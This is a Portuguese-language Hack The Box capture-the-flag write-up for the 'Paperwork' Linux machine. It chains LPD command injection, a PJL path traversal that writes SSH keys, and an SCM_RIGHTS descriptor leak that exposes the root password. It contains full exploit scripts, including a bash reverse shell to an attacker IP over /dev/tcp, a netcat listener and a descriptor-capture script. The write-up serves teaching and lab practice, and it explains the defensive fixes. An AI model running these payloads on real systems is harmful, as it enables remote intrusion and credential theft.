# Writeup — Hack The Box: Paperwork

**Sistema:** Linux (Ubuntu)

---

## Sumário

| Etapa | Técnica |
|---|---|
| Reconhecimento | Nmap, análise do site (Intake Portal) |
| Acesso inicial | Injeção de comando no protocolo LPD (porta 1515) |
| Escalada 1 | Path Traversal no JetDirect/PJL (porta 9100) → usuário archivist |
| Flag de usuário | SSH como archivist com chave via authorized_keys sobrescrito |
| Escalada de privilégio | Vazamento de file descriptor via SCM_RIGHTS (Unix socket) |
| Flag de root | su root com senha vazada |

---

## Como ler este writeup

Cada bloco de comando tem uma etiqueta indicando **onde** ele deve ser executado:

- 🖥️ **ATACANTE (Kali)** — rode no seu terminal Kali/pwnbox, fora da máquina alvo.
- 🎯 **VÍTIMA — shell `lp`** — rode dentro da shell reversa obtida na Fase 2.
- 🎯 **VÍTIMA — shell `archivist`** — rode dentro da conexão SSH obtida na Fase 3.
- 📖 **APENAS LEITURA (código-fonte)** — código do serviço já rodando na máquina, mostrado só para entendimento. **Não se executa.**

---

## 1. Reconhecimento

### 1.1 Scan de portas com Nmap

🖥️ **ATACANTE (Kali):**
```bash
nmap -sC -sV -p- paperwork.htb
```

**Resultado:**
```
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

Três portas relevantes:
- **22** — SSH (usaremos mais tarde, com chave)
- **80** — site institucional
- **1515** — um serviço "tipo impressora". O fingerprint `Archive_Printer is ready and printing.` e a porta 1515 são a assinatura clássica do **LPD (Line Printer Daemon)**, protocolo definido na **RFC 1179**, usado historicamente para enviar trabalhos de impressão pela rede.

> 💡 **Nota didática:** LPD é um protocolo antigo (anos 80), sem autenticação nativa robusta, muito usado em ambientes corporativos legados. Encontrar a porta 1515 (ou a porta padrão 515) já é um sinal de que vale a pena investigar implementações customizadas do protocolo — elas costumam ter bugs de parsing.

### 1.2 Site (porta 80) — Intake Portal

Ao acessar `http://paperwork.htb`, encontramos uma página "Intake Portal" com informações valiosas:

| Campo | Valor |
|---|---|
| Protocolo | RFC 1179 (confirma LPD) |
| Target Queue | `archive_intake` |
| Internal Processor | link para `paperwork-archive-v1.02` |

O nome da **fila** (`archive_intake`) é um dado crítico — no protocolo LPD, a fila de destino é validada pelo servidor, e sem o nome certo o job é rejeitado.

O link `paperwork-archive-v1.02` disponibiliza um **ZIP com o código-fonte** do serviço LPD rodando na porta 1515 — uma baita ajuda para achar a vulnerabilidade sem precisar fazer engenharia reversa às cegas.

### 1.3 Baixando e extraindo o código-fonte

🖥️ **ATACANTE (Kali):**
```bash
curl -O http://paperwork.htb/<caminho-do-link>
file paperwork-archive-v1.02.zip
unzip paperwork-archive-v1.02.zip
```

Resultado: um arquivo `server.py`.

---

## 2. Acesso Inicial — RCE via injeção de comando no LPD

### 2.1 Analisando o código-fonte

📖 **APENAS LEITURA — trecho de `server.py`:**
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

O valor de `job_name` vem direto de uma linha do "control file" enviado pelo cliente (qualquer linha que comece com `J`), **sem nenhuma sanitização**, e é interpolado dentro de uma string executada com `shell=True`. Isso é uma **injeção de comando clássica**: se `job_name` contiver algo como `'; comando_malicioso; #`, o shell vai fechar a string do `echo` com a aspas simples, executar `comando_malicioso`, e comentar o resto da linha com `#`.

> 💡 **Nota didática:** `shell=True` no `subprocess.Popen`/`subprocess.run` é sempre um ponto de atenção em auditoria de código. Sempre que uma variável controlada pelo usuário é concatenada numa string que vai para um shell, existe risco de injeção — a defesa correta seria usar `shlex.quote()`, ou melhor ainda, passar os argumentos como lista (`shell=False`).

### 2.2 Entendendo o protocolo

O fluxo que o servidor espera, olhando a lógica do `LpdHandler`:

1. Cliente conecta e manda **1 byte = `0x02`** (comando "receive job") seguido do **nome da fila** + `\n`. A fila precisa estar dentro de `VALID_QUEUE` → por isso usamos `archive_intake`, confirmado no site.
2. Servidor responde e entra em loop aguardando "subcomandos".
3. Cliente manda um subcomando (1 byte qualquer) + `"<tamanho> <nome>\n"`.
4. Servidor confirma com `0x00`.
5. Cliente manda o conteúdo do "control file" — um bloco de texto onde uma das linhas começa com `J` seguido do nome do job.
6. O servidor extrai esse `job_name` e o injeta no `subprocess.Popen`.

### 2.3 Script de exploração

🖥️ **ATACANTE (Kali) — crie o exploit:**
```python
#!/usr/bin/env python3
import socket, time

HOST = "paperwork.htb"
PORT = 1515
LHOST = "SEU_IP_TUN0"     # IP da sua VPN (tun0)
LPORT = 4444

s = socket.create_connection((HOST, PORT))

# 1. seleciona a fila certa
s.sendall(b"\x02archive_intake\n")
time.sleep(0.3)

# 2. monta o control file com a injeção no job_name
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
job_name = f"test'; {cmd} #"
content = f"J{job_name}\n".encode()

# 3. envia o cabeçalho do subcomando (tamanho tem que bater EXATO)
header = b"\x02" + f"{len(content)} x\n".encode()
s.sendall(header)
time.sleep(0.3)
print("ack header:", s.recv(1024))

# 4. envia o conteúdo (control file)
s.sendall(content)
time.sleep(1)
print("resposta:", s.recv(4096))

s.close()
```

🖥️ **ATACANTE (Kali) — listener, ANTES de rodar o exploit:**
```bash
nc -nlvp 4444
```

🖥️ **ATACANTE (Kali) — execute o exploit:**
```bash
python3 exploit.py
```

**Resultado esperado:** uma shell reversa cai no terminal do `nc`, como usuário `lp`.

> ⚠️ **Ponto de atenção prático:** o `SIZE` enviado no header precisa bater exatamente com o número de bytes do conteúdo, senão o servidor trava esperando mais dados.

---

## 3. Escalando de `lp` para `archivist` via JetDirect (path traversal)

### 3.1 Reconhecimento interno

🎯 **VÍTIMA — shell `lp`:**
```bash
ss -tlnp
```
```
tcp  0.0.0.0:1515      LISTEN   python3 (LPDServer)
tcp  127.0.0.1:9100    LISTEN   -
tcp  127.0.0.1:1337    LISTEN   -
```

A porta **9100** só escuta em `127.0.0.1` — só acessível de dentro da máquina. Porta 9100 é a porta padrão do protocolo **JetDirect/PJL** (usado por impressoras HP para gerenciamento remoto).

🎯 **VÍTIMA — shell `lp`:**
```bash
id
cat /etc/passwd | grep archivist
```
```
uid=7(lp) gid=7(lp) groups=7(lp)
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

### 3.2 Entendendo o serviço JetDirect

📖 **APENAS LEITURA — trecho de `/home/archivist/printer/jetdirect.py`:**
```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))
```

O método `_translate` monta o caminho final concatenando a raiz configurada com o path fornecido pelo cliente, sem bloquear sequências `../`. Isso é um **path traversal clássico**: enviando `NAME="../.ssh/authorized_keys"`, o `os.path.normpath` resolve para fora do diretório raiz, permitindo escrever na pasta pessoal do `archivist`, já que o serviço roda com esse usuário.

O comando PJL relevante é o `FSDOWNLOAD`:
```
@PJL FSDOWNLOAD NAME="<caminho>" SIZE=<tamanho>
<conteúdo>
```

> 💡 **Nota didática:** PJL (Printer Job Language) é uma linguagem de controle criada pela HP para gerenciar impressoras. Muitas impressoras reais expõem comandos `FSDOWNLOAD`/`FSUPLOAD`/`FSDIRLIST` na porta 9100 sem autenticação — path traversal aqui é uma vulnerabilidade real documentada em impressoras de verdade.

### 3.3 Gerando uma chave SSH

🎯 **VÍTIMA — shell `lp`:**
```bash
ssh-keygen -t ed25519 -f /tmp/paperwork_key -N ""
cat /tmp/paperwork_key.pub
```

> 💡 O par de chaves foi gerado dentro da própria vítima. Isso resolve a próxima etapa (só precisamos da pública lá), mas cria uma pendência: a chave privada, necessária para o SSH do Kali se autenticar, também ficou presa dentro da vítima — resolvida na seção 3.5.

### 3.4 Escrevendo a chave pública via path traversal

A shell reversa da Fase 2 **não é um terminal completo (TTY)**. Colar scripts multilinha (com `nano` ou heredoc) faz o bash quebrar. Solução: montar o script no Kali, converter para uma linha em **base64**, e decodificar dentro da vítima.

🖥️ **ATACANTE (Kali) — crie o script:**
```bash
cat << 'EOF' > /tmp/write_key.py
import socket, time

pubkey = "ssh-ed25519 AAAA...SUA_CHAVE... lp@paperwork\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))

cmd = f'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE={len(pubkey)}\r\n'
s.send(cmd.encode())
time.sleep(0.5)
s.send(pubkey.encode())
time.sleep(1)

try:
    print(s.recv(4096).decode(errors="ignore"))
except:
    pass
s.close()
EOF
```

🖥️ **ATACANTE (Kali) — gere o base64:**
```bash
base64 -w0 /tmp/write_key.py
```

🎯 **VÍTIMA — shell `lp` — diretório gravável + decodificar:**
```bash
cd /tmp
echo "COLE_AQUI_O_BASE64" | base64 -d > write_key.py
```

> ⚠️ **Atenção ao diretório:** rodar em `/opt/LPDServer` resulta em `Permission Denied` — `/tmp` é gravável por qualquer usuário.

🎯 **VÍTIMA — shell `lp` — execute:**
```bash
cat write_key.py
python3 write_key.py
```

Resposta esperada: `OK` — chave escrita em `/home/archivist/.ssh/authorized_keys`.

### 3.5 Resolvendo a pendência da chave privada

Tentar `ssh -i /tmp/paperwork_key archivist@paperwork.htb` direto do Kali falha — esse arquivo existe só dentro da vítima.

🎯 **VÍTIMA — shell `lp` — mostre a chave privada:**
```bash
cat /tmp/paperwork_key
```

🖥️ **ATACANTE (Kali) — recrie o arquivo:**
```bash
cat > /tmp/paperwork_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
(cole aqui o conteúdo copiado da vítima)
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 /tmp/paperwork_key
```

> ⚠️ O `chmod 600` é obrigatório — o SSH recusa chaves privadas com permissões abertas demais.

### 3.6 Conectando como `archivist`

🖥️ **ATACANTE (Kali):**
```bash
ssh -i /tmp/paperwork_key archivist@paperwork.htb
```

🎯 **VÍTIMA — shell `archivist`:**
```bash
cat user.txt
```

---

## 4. Escalando de `archivist` para `root`

### 4.1 Reconhecimento

🎯 **VÍTIMA — shell `archivist`:**
```bash
find / -name "*.sock" 2>/dev/null
```
```
/run/paperwork/mgmt.sock
```

```bash
ps aux
```
```
root  1453  /usr/bin/python3 /usr/bin/paperwork-daemon
```

Esse daemon roda como **root** — é ele quem gerencia o `mgmt.sock`.

### 4.2 Lendo o código do daemon

🎯 **VÍTIMA — shell `archivist` (leitura):**
```bash
cat /usr/bin/paperwork-daemon
```

📖 **APENAS LEITURA — trecho do código do daemon:**
```python
try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
    ...
```

**O que está acontecendo:**

1. Ao iniciar, o daemon abre `/etc/paperwork/admin_pins.conf` (contém `ADMIN_PASSWORD=...`) e guarda o file descriptor (`admin_fd`) — esse arquivo só é legível por root.
2. Toda conexão no `mgmt.sock` verifica se o log do JetDirect contém rastros de `FSQUERY`, `FSUPLOAD` ou `FSDOWNLOAD`.
3. Como já usamos `FSDOWNLOAD` na Fase 3, esse rastro **já está no log** — deixamos o gatilho armado sem querer.
4. Se o log contém o gatilho, o daemon entra em "lockdown" e manda os FDs (`log_fd` e `admin_fd`) via **`SCM_RIGHTS`**.

> 💡 **Nota didática — `SCM_RIGHTS`:** mecanismo de sockets Unix que permite um processo passar file descriptors abertos para outro processo, mesmo com privilégios diferentes. Quem recebe o FD ganha o acesso que o processo original tinha ao abrir o arquivo — mesmo sem permissão própria para abri-lo. É legítimo (usado por exemplo para passar sockets de rede entre processos), mas usado sem cuidado vira escalada de privilégio.

### 4.3 Confirmando o gatilho

🎯 **VÍTIMA — shell `archivist`:**
```bash
cat /home/archivist/printer/logs/commands.log
```
```
Command: @PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=94
Receiving file: ../.ssh/authorized_keys (94 bytes)
```

Confirmado: o rastro do nosso próprio path traversal é o gatilho.

### 4.4 Capturando o FD vazado

🎯 **VÍTIMA — shell `archivist` (TTY completo via SSH):**
```bash
cd /tmp
cat > leak.py << 'EOF'
import socket, array, os

SOCK_PATH = "/run/paperwork/mgmt.sock"

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK_PATH)

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))
print("[msg]", msg.decode(errors="ignore"))

for level, ctype, cdata in ancdata:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        n = len(cdata) - (len(cdata) % fds.itemsize)
        fds.frombytes(cdata[:n])

print("[fds]", list(fds))
for fd in fds:
    try:
        print(f"[fd {fd}]", os.pread(fd, 1024, 0).decode(errors="ignore"))
    except Exception as e:
        print(f"[fd {fd}] erro:", e)

s.close()
EOF
cat leak.py
python3 leak.py
```

**Resultado:**
```
[msg] ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[fds] [4, 5]
[fd 4] (conteúdo do commands.log)
[fd 5] ADMIN_PASSWORD=ApparelMortuaryCedar22
```

O `fd 5` corresponde ao `admin_fd` — a senha de root em texto puro.

> 💡 **Por que funciona com `os.pread`:** lê diretamente do file descriptor, sem reabrir o arquivo — e como recebemos esse FD via `SCM_RIGHTS`, o kernel já concede a permissão que o processo root tinha, independente do usuário rodando o script (`archivist`).

### 4.5 Virando root

🎯 **VÍTIMA — shell `archivist`:**
```bash
su root
```
Senha: `ApparelMortuaryCedar22`

🎯 **VÍTIMA — agora como `root`:**
```bash
cat /root/root.txt
```

---

## 5. Vulnerabilidades Exploradas

| Vulnerabilidade | Serviço | Impacto |
|---|---|---|
| Injeção de comando (`shell=True` sem sanitização) | LPD custom (porta 1515) | RCE remoto → shell `lp` |
| Path Traversal em `FSDOWNLOAD` (PJL) | JetDirect custom (porta 9100, interno) | Escrita arbitrária → shell `archivist` |
| Vazamento de FD via `SCM_RIGHTS` | Daemon de gerenciamento (`mgmt.sock`) | Vazamento de senha → root |

---

## 6. Linha do Tempo

```
Reconhecimento
  └─ nmap → portas 22, 80, 1515
  └─ site → fila "archive_intake" + link do código-fonte

Acesso Inicial
  └─ leitura do server.py → injeção de comando via job_name
  └─ exploit em Python → shell reversa como "lp"

Escalada 1 (lp → archivist)
  └─ ss -tlnp → porta 9100 interna (JetDirect/PJL)
  └─ leitura do jetdirect.py → path traversal em FSDOWNLOAD
  └─ chave SSH gerada na vítima, pública escrita via traversal
  └─ chave privada copiada de volta pro Kali
  └─ SSH como archivist

Flag user.txt ✅

Escalada de Privilégio (archivist → root)
  └─ find /*.sock → /run/paperwork/mgmt.sock
  └─ leitura do paperwork-daemon → gatilho de log + SCM_RIGHTS
  └─ log já continha rastro do FSDOWNLOAD anterior
  └─ script de captura de FD → senha de admin vazada
  └─ su root

Flag root.txt ✅
```

---

## 7. Lições e conceitos para levar dessa máquina

1. **`shell=True` + interpolação de string é sempre perigoso.** Nunca confie em input do usuário indo direto pra um shell.
2. **Path traversal não é só em servidores web.** Qualquer protocolo que aceite um "nome de arquivo" como parâmetro merece a mesma desconfiança de um endpoint HTTP.
3. **Ações deixam rastro — e rastros podem ser armas de dois gumes.** O ataque da fase anterior ficou logado e virou o gatilho que deu a senha de root.
4. **`SCM_RIGHTS` é uma superfície de ataque pouco conhecida.** Vale enumerar sockets Unix (`find / -name "*.sock"`) durante pós-exploração.
5. **Shells reversas simples não são TTYs completos.** Use transferência via base64 numa linha só, ou faça upgrade da shell (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).
6. **Chaves SSH geradas remotamente não aparecem no Kali automaticamente.** A chave privada também precisa ser transferida de volta.

---

*Máquina: HTB Paperwork — writeup elaborado a partir de sessão prática de exploração.*
